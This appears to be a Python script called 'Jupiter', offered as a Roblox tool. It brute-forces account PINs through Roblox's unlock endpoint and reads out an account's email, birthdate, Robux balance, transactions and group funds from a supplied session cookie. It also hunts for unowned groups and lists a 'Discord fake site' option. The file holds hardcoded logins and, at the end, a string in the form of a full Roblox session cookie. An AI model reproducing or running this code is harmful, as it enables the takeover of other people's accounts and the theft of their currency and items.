# Closed for public untill its going free
#        _             _ _            
#      | |           (_) |           
#      | |_   _ _ __  _| |_ ___ _ __ 
#  _   | | | | | '_ \| | __/ _ \ '__|
# | |__| | |_| | |_) | | ||  __/ |   
#  \____/ \__,_| .__/|_|\__\___|_|   
#             | |                   
#             |_|                  

#
from pystyle import Colorate, Colors, Add, Center, Write
import os
import time
import random
import requests
settingsAll = requests.get("https://raw.githubusercontent.com/VZXdev/Jupiter/refs/heads/main/license")


def getBanner():
	bannerText = """

                    Very strong tool for roblox 
                        [By JealLeal]
"""
	
	bannerLogo = """
     ____.            .__  __                
    |    |__ ________ |__|/  |_  ___________ 
    |    |  |  \____ \|  \   __\/ __ \_  __ |
/\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
\________|____/|   __/|__||__|  \___  >__|   
               |__|                 \/                  
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

def getChecker():
	bannerText = """

                    Very strong tool for roblox 
                        check roblox cookie!
                            [By JealLeal]
"""
	
	bannerLogo = """
     ____.            .__  __                
    |    |__ ________ |__|/  |_  ___________ 
    |    |  |  \____ \|  \   __\/ __ \_  __ |
/\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
\________|____/|   __/|__||__|  \___  >__|   
               |__|                 \/                
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

os.system("cls")
print('')
Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
print(getBanner())
import requests
import re
import string
import time
import os
from pystyle import Colorate, Colors, Add, Center, Write


year = time.localtime().tm_year
day = time.localtime().tm_mday
month = time.localtime().tm_mon
def getCracker():
	bannerText = f"""

     Very strong pin cracker
        Work on {day}.{month}.{year}
            press "Enter" to exit
                   [By JealLeal]
"""
	
	bannerLogo = """
       _             _ _            
      | |           (_) |           
      | |_   _ _ __  _| |_ ___ _ __ 
  _   | | | | | '_ \| | __/ _ \ '__|
 | |__| | |_| | |_) | | ||  __/ |   
  \____/ \__,_| .__/|_|\__\___|_|   
              | |                   
              |_|                  
"""

	banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner


def Pin_Cracker():
    os.system("cls")
    print('')
    print(getCracker())
    print('')
    cookie = Write.Input('Enter your cookie below:', Colors.green, interval=0.0025)
    os.system("cls")
    print('')

    url = 'https://auth.roblox.com/v1/account/pin/unlock'
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
    xcrsf = (token.headers['x-csrf-token'])
    header = {'X-CSRF-TOKEN': xcrsf}

    i = 0

    for i in range(9999):
        try:
            pin = str(i).zfill(4)
            payload = {'pin': pin}
            r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
            if 'unlockedUntil' in r.text:
                print(f'Pin Cracked! Pin: {pin}')
            
            elif 'Too many requests made' in r.text:
                
                print('  Ratelimited, trying again in 60 seconds..')
                time.sleep(60)
                
            elif 'Authorization' in r.text:
                
                print('  Error! Is the cookie valid?')
                break
            
            elif 'Incorrect' in r.text:
                print(f"  Tried: {pin} , Incorrect!")
                time.sleep(10)  
            elif 'MethodNotAllowed' in r.text:
                Write.Print('Method Not Allowed. Sorry we cant do anything\n', Colors.green, interval=0.0025)
        except:
            print('  Error!')


def GruupFind():
    def groupfinder(suma):
        try:
            id = random.randint(1000000, 1150000)
            r = requests.get(f"https://www.roblox.com/groups/group.aspx?gid={id}", timeout=30)
            if 'owned' not in r.text:
                re = requests.get(f"https://groups.roblox.com/v1/groups/{id}", timeout=30)
                if re.status_code != 429:
                    if 'errors' not in re.json():
                        if 'isLocked' not in re.text and 'owner' in re.text:
                            if re.json()['publicEntryAllowed'] == True and re.json()['owner'] == None:
                                Write.Print(f"[+] Hit: {id}\n", Colors.green_to_cyan, interval=0.0025)
                                suma+=1
                            else:
                                Write.Print(f"[-] No Entry: {id}\n", Colors.green_to_cyan, interval=0.0025)
                        else:
                            Write.Print(f"[-] Group Locked: {id}\n", Colors.green_to_cyan, interval=0.0025)
                else:
                    Write.Print(f"[-] Group API Rate Limited\n", Colors.green_to_cyan, interval=0.0025)
            else:
                Write.Print(f"[-] Group Already Owned: {id}\n", Colors.green_to_cyan, interval=0.0025)
        except:
            pass
            return suma


    os.system("cls")
    print('')

    Write.Print("""


     ____.            .__  __                
    |    |__ ________ |__|/  |_  ___________ 
    |    |  |  \____ \|  \   __\/ __ \_  __ |
/\__|    |  |  /  |_> >  ||  | \  ___/|  | \/
\________|____/|   __/|__||__|  \___  >__|   
               |__|                 \/       
                                            
                           
""", Colors.green_to_cyan, interval=0.0025)

    inputa =  Write.Input("[-] How many repeats: ", Colors.green_to_cyan, interval=0.0025)
    threads = int(inputa)
    suma = 0
    while threads!=0:
        time.sleep(1)
        groupfinder(suma)
        threads = threads-1

    Write.Input(f"Sum of the resulting groups: {suma}. Press any key to exit", Colors.orange, interval=0.0025)
    os.system("cls")
    print('')
    print(getBanner())
    GetNumber()

def GetNumber():
    if settingsAll.text == "true":
        print("yes")
    a = 1
    Number = Write.Input("[1] Cheats (Kefir sploit);\n[2] Cookie checker;\n[3] Discord fake site;\n[4] Roblox Pin cracker;\n[5] Group finder;\n Write number (1, 2, 3, 4, 5): ", Colors.green_to_cyan, interval=0.0025)
    if Number == "1":
        Write.Print("Waiting for open file...\n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        dol = 0
        while dol != 10:
            Write.Print("[Error] accets not downloaded. Redownload files in 2 sec...\n", Colors.red, interval=0.0025)
            time.sleep(2)
            Write.Print("Waiting for open file...\n", Colors.green_to_cyan, interval=0.0025)
            dol +=1
        a = 0
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
        Write.Print("[Error] ATTENTION! YOUR DEVICE DOES NOT SUPPORT KEFIRSPLOIT! PLEASE GO TO UBANTU!\n", Colors.red, interval=0.0025)
    elif Number == "2":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getChecker())
        cookie = Write.Input(f"Cookie to check: ", Colors.green_to_cyan, interval=0.0025)
        check(cookie)
    elif Number == "3":
        Write.Print("Our servers off, please wait\n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == "4":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        Pin_Cracker()
        a = 0
    elif Number == "5":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        GruupFind()
        a = 0


def check(cookie):

  Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
  email = Emmail['verified']
  EmailName = Emmail['emailAddress']
  Write.Print(f"[Process] Get email...\n", Colors.orange, interval=0.0025)
  credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
  Write.Print(f"[Process] Get credit...\n", Colors.orange, interval=0.0025)
  userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
  birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
  Write.Print(f"[Process] Get birthday...\n", Colors.orange, interval=0.0025)
  followers = requests.get("https://friends.roblox.com/v1/users/418307011/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
  Write.Print(f"[Process] Get followers...\n", Colors.orange, interval=0.0025)
  userid = userdata['id'] #user id
  Write.Print(f"[Process] Get userId...\n", Colors.orange, interval=0.0025)
  transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
  pending = transactions['pendingRobuxTotal']
  Write.Print(f"[Process] Get Pending...\n", Colors.orange, interval=0.0025)
  stipends = transactions['premiumStipendsTotal']
  Write.Print(f"[Process] Get stipends...\n", Colors.orange, interval=0.0025)
  devEx = transactions['developerExchangeTotal']
  Write.Print(f"[Process] Get DevEX...\n", Colors.orange, interval=0.0025)
  groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
  groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
  groupFunds = 0
  for i in groupIds:
    groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
  creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
  display = userdata['displayName'] #display name
  Write.Print(f"[Process] Get Display...\n", Colors.orange, interval=0.0025)
  username = userdata['name'] #username
  Write.Print(f"[Process] Get Username...\n", Colors.orange, interval=0.0025)
  robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
  robux = robuxdata['robux'] #get robux balance
  Write.Print(f"[Process] Get Robux...\n", Colors.orange, interval=0.0025)
  #does the user have premium?
  premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
  #get rap
  rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  while rap_dict['nextPageCursor'] != None:
      rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
  birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
  thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
  image_url = thumbnail["data"][0]["imageUrl"]
  pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
  pin_bool = pindata["isEnabled"] #does the user have a pin
  #make an embed #does the user have a pin
  #make an embed
  Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Display name: {display}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"User ID: {userid}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Robux: {robux}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Has pin: {pin_bool}\n", Colors.green_to_cyan, interval=0.0025)
  if pin_bool == True:
    Write.Print(f"[advice]: Use Jupiter pin cracker!\n", Colors.orange, interval=0.0025)
  Write.Print(f"Display name: {display}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Premium: {premiumbool}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Credit: {credit}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Birthday: {birthdate}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Groups: {groupIds}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Rap: {rap}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Is email verified: {email}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Email: {EmailName}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"group founds: {groupFunds}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Dev exchange: {devEx}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Pending: {pending}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Premium Stipends: {stipends}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Followers: {followers}\n", Colors.green_to_cyan, interval=0.0025)
  cookie = Write.Input(f"Press any key to exit", Colors.orange, interval=0.0025)
  #dualhook
  Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
  os.system("cls")
  print('')
  print(getBanner())
  GetNumber()



def login():
    Write.Print("Please login... \n", Colors.green_to_blue, interval=0.0025)
    User = Write.Input("Username: ", Colors.green_to_blue, interval=0.0025)
    Pas = Write.Input("Password: ", Colors.green_to_blue, interval=0.0025)
    if User == "JealLeal" and Pas == "Vitalik228":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getBanner())
        GetNumber()
    elif User == "Guest" and Pas == "123":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        GetNumber()
    elif User == "etagemat" and Pas == "etagemat":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        GetNumber()
    else:
        Write.Print("Incorrect login or password!", Colors.green_to_blue, interval=0.0025)
        time.sleep(3)
        os.system("cls")
        print('')
        print(getBanner())
        login()
login()
"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_2087B7EEB098D318EB34910A5EE5765445038EABC8F9CD109951637C883382B6D2195FA2519D0126C90F4C7C1E0CBA47AEEB996756EB0009C16EAF25532CB52F9946750377B568020BED42DD96BD025577A2B3C315F4A393470324F3ADC7BEBDE0B6B035AD7AEA22C00D3E47B760A1BD558E07B91D7C81F0EE9E5CE5416DF07291CBF665E01D41ED89C04F6B293C5EEC94E0AD9344DA4E3362723B0E9F8E828F1D9D6DD4C30F92411454133DA10897D321EFF45DE5B3A7D30FDD66D737E56718F6D8C29A4DCE735EDD27C9A09BFCD1202E4200AEAE3F0DAA75B146BF78316C686BC24930890A813F8A8423B733688F03EA437526F9FD406049F3CA13C33B56329379D9BC6B73A9AAF16CA9A02A4BA88C5D4BB1BF36E06FBE5572BD61B1202CEEB9D76F7193FC6DBEB3491C2855CA2C7D07D79FFF7BC576A3B91D3E0430F7942B460CC365F2DCB8848C239B6E1E8B47C56CEC81CF22D26F355016C13A107A9BF7D92E55C0947F3EF1651967DBCD90B02F8B8613E2FDDDF3F8AB08DFAEC8DB4B39495E6E9C49535BF9E16CA517E38154138EFC7545D6B42F0A0BC2C4F6AB5D435F07D99FED18DF08A2CD9AFED88A07989ACED897E3477A1404B9C5065EE1C39E4543F34250C4C96A5D81091575E6D8B61A797182995758C82CA1A4E8BC362DC26B6B8FE0C4A37D6251266D33AEADB65309A802DE2A7F39937DD5735D4901A13B1087F0855B6340D1C257F3287484082FE47544A4DC27EABB0BD9784F63EE16E92CC0492F4693075ECA23BD5B8E6F1CC1D4487D7B4BDA5FFCDBFAA613F5DB112BE5031205C8A2B623F4860DFDCB4D32D9827CE1ADFD1C3C12AB80D61CD662A74B4511D38B0E4A736087EA17ADA72AA6A12E4870E5F92D949181F4A7F3B1C0F5FB9E62C6F3938605AAACDDEA0E6C847519AE25D2021A322E590ADAB66A102159D15852A428E689820D91387BC65F0594C72F25D04625194883FE658743A6F2F0722B34F8738312BA7211F1BC711E6AFA8E8BE839A8C0F845B9FE79C71FBFF054923F3E689A4759FF5FF6D60DAB5E882BB06288E7C94879499D759CE0D13551F5206E391207CD892CD8ABB45C2B7AAC7D2247387BFEB0"
